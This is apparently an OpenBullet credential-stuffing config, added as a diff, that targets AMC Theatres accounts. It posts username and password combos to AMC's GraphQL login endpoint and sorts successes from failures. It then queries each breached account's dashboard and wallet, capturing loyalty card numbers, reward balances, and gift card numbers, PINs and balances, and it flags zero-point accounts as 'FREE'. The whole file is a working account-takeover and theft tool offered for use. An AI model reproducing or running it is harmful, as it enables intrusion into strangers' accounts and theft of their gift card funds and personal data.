@@ -1,0 +1,110 @@
+[SETTINGS]
+{
+  "Name": "AMC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-16T14:52:25.1405207-04:00",
+  "AdditionalInfo": "",
+  "Author": "LethalLuck",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://amctheatres.com/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+FUNCTION RandomGUID "guid" 
+
+REQUEST POST "https://graph.amctheatres.com/" 
+  CONTENT "{\"operationName\":\"userLogin\",\"variables\":{\"input\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}},\"query\":\"mutation userLogin($input: LoginInput!) { userLogin(input: $input) { user { id ...featureFlagsFatQuery account { id ...accountFatQuery __typename } __typename } __typename }}fragment accountFatQuery on Account { accountId accountType displayName emailAddress hasProductSubscription token __typename}fragment featureFlagsFatQuery on User { sessionId account { accountId accountType featureFlagsHash hasProductSubscription productSubscription { id type typeCode __typename } __typename } __typename}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-amc-request-id: <guid>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "accountType" 
+  KEYCHAIN Failure OR 
+    KEY "\"userLogin\":null" 
+
+PARSE "<SOURCE>" JSON "typeCode" -> CAP "Subscription" 
+
+!REQUEST POST "https://graph.amctheatres.com/" 
+!  CONTENT "{\"operationName\":\"Header\",\"variables\":{\"maxMenuItemCount\":9},\"query\":\"query Header($maxMenuItemCount: Int) { viewer { user { account { id ...HeaderBranding_Account __typename } __typename } ...GlobalNotifications_Viewer ...MenuWrapper_Viewer ...MobileNav_Viewer __typename } } fragment HeaderBranding_Account on Account { displayName __typename } fragment MenuWrapper_Viewer on Viewer { ...AccountMenu_Viewer ...ConcessionsMenu_Viewer ...ExtrasMenu_Viewer ...GiftCardsMenu_Viewer ...MoviesMenu_Viewer ...TheatresMenu_Viewer __typename } fragment AccountMenu_Viewer on Viewer { user { account { id accountType hasProductSubscription ...AccountInfo_Account __typename } __typename } ...AccountHero_Viewer __typename } fragment AccountHero_Viewer on Viewer { product(sku: \\\"loyalty-new\\\") { id cost previousCost __typename } topMovie: movies(first: 1, availability: NOW_PLAYING) { edges { node { id ...MovieHero_Movie __typename } __typename } __typename } user { id account { id accountType events(type: Upcoming, first: 1) { edges { node { id ...EventHero_AccountEvent __typename } __typename } __typename } hasProductSubscription movies(first: 1) { edges { node { id movie { id ...ReminderHero_Movie __typename } __typename } __typename } __typename } __typename } __typename } ...ProductSubscriptions_Viewer __typename } fragment EventHero_AccountEvent on AccountEvent { token movie { id name slug heroDesktopDynamic: image(contentType: HeroDesktopDynamic) { id url __typename } movieStillDynamic: image(contentType: MovieStillDynamic) { id url __typename } __typename } theatre { id name __typename } showtime { id display { date time amPm __typename } __typename } __typename } fragment MovieHero_Movie on Movie { name synopsisTagLine slug heroDesktopDynamic: image(contentType: HeroDesktopDynamic) { id url __typename } movieStillDynamic: image(contentType: MovieStillDynamic) { id url __typename } __typename } fragment ProductSubscriptions_Viewer on Viewer { id user { id selectedTheatre { id products(sku: \\\"SUBSCRIPTION-NEW\\\") { id items { cost __typename } __typename } __typename } __typename } alistDefaultTheatre: theatre(slug: \\\"38\\\") { id products(sku: \\\"SUBSCRIPTION-NEW\\\") { id items { sku cost __typename } __typename } __typename } __typename } fragment ReminderHero_Movie on Movie { status slug name releaseDateUtc heroDesktopDynamic: image(contentType: HeroDesktopDynamic) { id url __typename } movieStillDynamic: image(contentType: MovieStillDynamic) { id url __typename } __typename } fragment AccountInfo_Account on Account { accountType productSubscription { id isActive ...Reservations_AccountProductSubscription __typename } rewards { id pointBalance ...RewardSummary_RewardSummary __typename } ...AccountImage_Account __typename } fragment AccountImage_Account on Account { accountType ...accountUtils_Account __typename } fragment accountUtils_Account on Account { accountType isActive hasProductSubscription __typename } fragment Reservations_AccountProductSubscription on AccountProductSubscription { counters { ticketsReserved: futureReservationCap { current max __typename } __typename } __typename } fragment RewardSummary_RewardSummary on RewardSummary { pendingPoints pointBalance pointsToNextReward __typename } fragment ConcessionsMenu_Viewer on Viewer { concessionsNav: navigation(key: \\\"header/concessions\\\") { id ...MenuLinkLists_Navigation __typename } user { ...MenuLinkLists_User __typename } __typename } fragment MenuLinkLists_Navigation on Navigation { modalName text url children(first: 6) { edges { node { id modalName text url children(first: $maxMenuItemCount) { count edges { node { id modalName text url children(first: $maxMenuItemCount) { count edges { node { id modalName text url __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } __typename } fragment MenuLinkLists_User on User { account { id accountId __typename } __typename } fragment ExtrasMenu_Viewer on Viewer { extrasNav: navigation(key: \\\"header/extras\\\") { id ...MenuLinkLists_Navigation __typename } user { ...MenuLinkLists_User __typename } blog { posts(first: 1) { edges { node { id ...BlogPostThumb_Post __typename } __typename } __typename } __typename } __typename } fragment BlogPostThumb_Post on BlogPost { id imageUrl title url publishedText tags { name priority __typename } __typename } fragment GiftCardsMenu_Viewer on Viewer { giftCardNav: navigation(key: \\\"header/gift-cards\\\") { id ...MenuLinkLists_Navigation __typename } user { ...MenuLinkLists_User __typename } __typename } fragment MoviesMenu_Viewer on Viewer { moviesNav: navigation(key: \\\"header/movies\\\") { id ...MenuLinkLists_Navigation __typename } user { ...MenuLinkLists_User __typename } movies(availability: NOW_PLAYING, first: $maxMenuItemCount) { count edges { node { id name websiteUrl synopsisTagLine hero: image(contentType: HeroDesktopDynamic) { id url __typename } movieStill: image(contentType: MovieStillDynamic) { id url __typename } heroNonDynamic: image(contentType: Hero) { id url __typename } __typename } __typename } __typename } __typename } fragment TheatresMenu_Viewer on Viewer { theatreNav: navigation(key: \\\"header/theatres\\\") { id ...MenuLinkLists_Navigation __typename } user { theatres { count edges { node { id addressLine1 addressLine2 city directionsUrl name postalCode stateCode websiteUrl __typename } __typename } __typename } ...MenuLinkLists_User __typename } __typename } fragment MobileNav_Viewer on Viewer { mobileMovieNav: navigation(key: \\\"mobile-header/movies\\\") { ...MenuLinkLists_Navigation __typename } mobileTheatreNav: navigation(key: \\\"mobile-header/theatres\\\") { ...MenuLinkLists_Navigation __typename } mobileConcessionsNav: navigation(key: \\\"mobile-header/concessions\\\") { ...MenuLinkLists_Navigation __typename } mobileOnDemandNav: navigation(key: \\\"mobile-header/on-demand\\\") { ...MenuLinkLists_Navigation __typename } mobileExtrasNav: navigation(key: \\\"mobile-header/extras\\\") { ...MenuLinkLists_Navigation __typename } mobileGiftCardsNav: navigation(key: \\\"mobile-header/gift-cards\\\") { ...MenuLinkLists_Navigation __typename } user { ...MenuLinkLists_User __typename } ...AccountHero_Viewer __typename } fragment GlobalNotifications_Viewer on Viewer { user { account { id notifications(type: ALL) { ...AccountNotification_AccountNotifications __typename } __typename } globalNotificationsDismissed __typename } notification { id ...GlobalNotification_Notification __typename } __typename } fragment AccountNotification_AccountNotifications on AccountNotification { href message notificationId __typename } fragment GlobalNotification_Notification on Notification { css { backgroundColor __typename } dismissable html { desktop mobile __typename } __typename } \"}" 
+!  CONTENTTYPE "application/json" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!REQUEST POST "https://graph.amctheatres.com/" 
+!  CONTENT "{\"operationName\":\"Rewards\",\"variables\":{},\"query\":\"query Rewards { viewer { user { id account { id ...Rewards_StubsRewards_Account __typename } __typename } __typename }}fragment Rewards_StubsRewards_Account on Account { accountId accountType rewards { id pointBalance savingsToDate expirations { amount expirationDate daysToExpire __typename } birthdayOffers { expirationDate daysToExpire comment __typename } bonusBucks { amount comment daysToExpire expirationDate __typename } __typename } __typename}\"}" 
+!  CONTENTTYPE "application/json" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+REQUEST POST "https://graph.amctheatres.com/" 
+  CONTENT "{\"operationName\":\"Dashboard\",\"variables\":{},\"query\":\"query Dashboard { viewer { user { account { id accountType hasProductSubscription ...RenewPremiereMembership_Account ...ProductSubscriptions_Account ...Rewards_StubsRewards_Account __typename } __typename } __typename }}fragment RenewPremiereMembership_Account on Account { accountId productSubscription { id isActive __typename } loyaltyCard { cardNumber enrollDate expirationDate expirationDateDisplay { date dateShort __typename } status statusInfo __typename } loyaltyUpgradeProduct { id cost previousCost __typename } ...accountUtils_Account __typename}fragment accountUtils_Account on Account { accountType isActive hasProductSubscription __typename}fragment ProductSubscriptions_Account on Account { ...ProductSubscriptionReservations_Account ...DashboardWelcome_Account ...RenewPremiereMembership_Account ...JoinAList_Account ...JoinPremiere_Account id hasProductSubscription productSubscription { id productAttributes { movieFilmWeekCap { value __typename } __typename } __typename } rewards { savingsToDate __typename } __typename}fragment ProductSubscriptionReservations_Account on Account { productSubscription { id ...UpcomingReservations_AccountProductSubscription ...CurrentWeekReservations_AccountProductSubscription __typename } ...ProductSubscriptionVisitTracker_Account __typename}fragment ProductSubscriptionVisitTracker_Account on Account { productSubscription { counters { movieMonthCap { current max __typename } plfMonthCap { current max __typename } outOfTierVisitsCap { current max __typename } __typename } __typename } __typename}fragment CurrentWeekReservations_AccountProductSubscription on AccountProductSubscription { counters { ticketsReserved: futureReservationCap { ...CurrentWeekReservations_ProductSubscriptionTicketCounter current max __typename } ticketsUsed: movieFilmWeekCap { ...CurrentWeekReservations_ProductSubscriptionTicketCounter current max __typename } __typename } ...CancelReservation_AccountProductSubscription __typename}fragment CurrentWeekReservations_ProductSubscriptionTicketCounter on ProductSubscriptionTicketCounter { current max tickets { isPast movie { id name image(contentType: PosterDynamic) { id url __typename } __typename } showDateTimeDisplay { monthDateShort prefix __typename } __typename } __typename}fragment CancelReservation_AccountProductSubscription on AccountProductSubscription { counters { ticketsUsed: movieFilmWeekCap { max __typename } __typename } __typename}fragment UpcomingReservations_AccountProductSubscription on AccountProductSubscription { counters { ticketsReserved: futureReservationCap { ...UpcomingReservation_ProductSubscriptionTicketCounter __typename } ticketsUsed: movieFilmWeekCap { ...UpcomingReservation_ProductSubscriptionTicketCounter __typename } __typename } __typename}fragment UpcomingReservation_ProductSubscriptionTicketCounter on ProductSubscriptionTicketCounter { current max tickets { ...UpcomingReservationItem_ProductSubscriptionTicket __typename } __typename}fragment UpcomingReservationItem_ProductSubscriptionTicket on ProductSubscriptionTicket { event { id token __typename } showDateTimeDisplay { amPm monthDateShort prefix time __typename } theatre { name __typename } titleName __typename}fragment DashboardWelcome_Account on Account { accountType hasProductSubscription productSubscription { id isActive nextBillDate { date dateShort __typename } productTypeDescription productAttributes { movieFilmWeekCap { value __typename } __typename } __typename } loyaltyCard { enrollDate enrollDateDisplay { date dateShort __typename } expirationDate expirationDateDisplay { date dateShort __typename } __typename } rewards { savingsToDateFormatted { USD __typename } __typename } __typename}fragment JoinAList_Account on Account { id accountId hasProductSubscription __typename}fragment JoinPremiere_Account on Account { id accountId accountType __typename}fragment Rewards_StubsRewards_Account on Account { accountId accountType rewards { id pointBalance savingsToDate expirations { amount expirationDate daysToExpire __typename } birthdayOffers { expirationDate daysToExpire comment __typename } bonusBucks { amount comment daysToExpire expirationDate __typename } __typename } __typename}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "amount" -> CAP "Rewards" "$" "" 
+
+PARSE "<SOURCE>" JSON "pointBalance" -> CAP "Points" 
+
+PARSE "<SOURCE>" JSON "accountType" -> CAP "Account Type" 
+
+PARSE "<SOURCE>" JSON "cardNumber" -> CAP "Card Number" 
+
+PARSE "<SOURCE>" JSON "enrollDate" -> CAP "Enroll Date" 
+
+PARSE "<SOURCE>" LR "\"birthdayOffers\":[" "]," -> CAP "Birthday Offers" 
+
+PARSE "<SOURCE>" LR "\"bonusBucks\":[" "]}" -> CAP "Bonus Bucks" 
+
+PARSE "<SOURCE>" LR "\"expirationDate\":\"" "\"" -> CAP "Reward Expiration" 
+
+REQUEST POST "https://graph.amctheatres.com/" 
+  CONTENT "{\"operationName\":\"Wallet\",\"variables\":{},\"query\":\"query Wallet { viewer { user { account { id loyaltyUpgradeProduct { id cost previousCost __typename } ...CreditCardSection_Account ...DisneyRewardsSection_Account ...GiftCardSection_Account ...PromoBoxItems_Account ...RenewPremiereMembership_Account ...StubsSection_Account __typename } __typename } __typename }}fragment CreditCardSection_Account on Account { ...CreditCards_Account hasProductSubscription requiresVerification requiresVerificationReason __typename}fragment CreditCards_Account on Account { id wallet { id creditCards { default merchantToken name ...CreditCard_CreditCard __typename } __typename } ...CreditCard_Account __typename}fragment CreditCard_Account on Account { ...CreditCardControls_Account __typename}fragment CreditCardControls_Account on Account { ...EditCreditCardModal_Account __typename}fragment EditCreditCardModal_Account on Account { ...EditCreditCardForm_Account hasProductSubscription __typename}fragment EditCreditCardForm_Account on Account { address1 address2 city state postalCode __typename}fragment CreditCard_CreditCard on CreditCard { cardHolderFirstName cardHolderLastName cardHolderEmail cardType expirationDateDisplay { monthYear __typename } lastFour merchantToken name ...CreditCardControls_CreditCard __typename}fragment CreditCardControls_CreditCard on CreditCard { address1 cardHolderFirstName cardHolderLastName cardHolderEmail city lastFour merchantToken postalCode state ...EditCreditCardModal_CreditCard __typename}fragment EditCreditCardModal_CreditCard on CreditCard { ...EditCreditCardForm_CreditCard cardType default expirationDateDisplay { monthYear __typename } lastFour merchantToken __typename}fragment EditCreditCardForm_CreditCard on CreditCard { cardHolderFirstName cardHolderLastName cardHolderEmail address1 address2 city default expirationDate expirationDateDisplay { monthYear __typename } lastFour merchantToken name postalCode state __typename}fragment DisneyRewardsSection_Account on Account { wallet { id disneyRewardsCardSummary { count __typename } ...DisneyRewardsCards_Wallet __typename } __typename}fragment DisneyRewardsCards_Wallet on Wallet { disneyRewardsCards { id balance lastFour merchantToken number pin __typename } __typename}fragment GiftCardSection_Account on Account { wallet { id ...GiftCards_Wallet __typename } __typename}fragment GiftCards_Wallet on Wallet { giftCards { id lastFour merchantToken ...GiftCardControls_GiftCard __typename } __typename}fragment GiftCardControls_GiftCard on GiftCard { number ...ViewGiftCardModal_GiftCard __typename}fragment ViewGiftCardModal_GiftCard on GiftCard { balance number pin qrCode __typename}fragment PromoBoxItems_Account on Account { id accountId accountType loyaltyUpgradeProduct { id cost previousCost __typename } __typename}fragment RenewPremiereMembership_Account on Account { accountId productSubscription { id isActive __typename } loyaltyCard { cardNumber enrollDate expirationDate expirationDateDisplay { date dateShort __typename } status statusInfo __typename } loyaltyUpgradeProduct { id cost previousCost __typename } ...accountUtils_Account __typename}fragment accountUtils_Account on Account { accountType isActive hasProductSubscription __typename}fragment StubsSection_Account on Account { accountType ...StubsCard_Account __typename}fragment StubsCard_Account on Account { ...accountUtils_Account ...SendMeCardByMail_Account accountId accountType displayName firstName hasProductSubscription lastName productSubscription { id nextBillDate { dateShort __typename } ticketsReserved { current max __typename } __typename } loyaltyCard { cardNumber expirationDate __typename } rewards { id pendingPoints pointsToNextReward pointBalance rewardsBalance __typename } __typename}fragment SendMeCardByMail_Account on Account { accountType canRequestCard cardRequestedDate hasProductSubscription ...VerifyAddressModal_Account __typename}fragment VerifyAddressModal_Account on Account { firstName lastName address1 address2 city state postalCode __typename}\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" JSON "number" Recursive=TRUE -> CAP "GC Number" 
+
+PARSE "<SOURCE>" JSON "pin" Recursive=TRUE -> CAP "GC Pin" 
+
+PARSE "<SOURCE>" JSON "balance" Recursive=TRUE -> CAP "GC Balance" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Points>" EqualTo "0" 
+
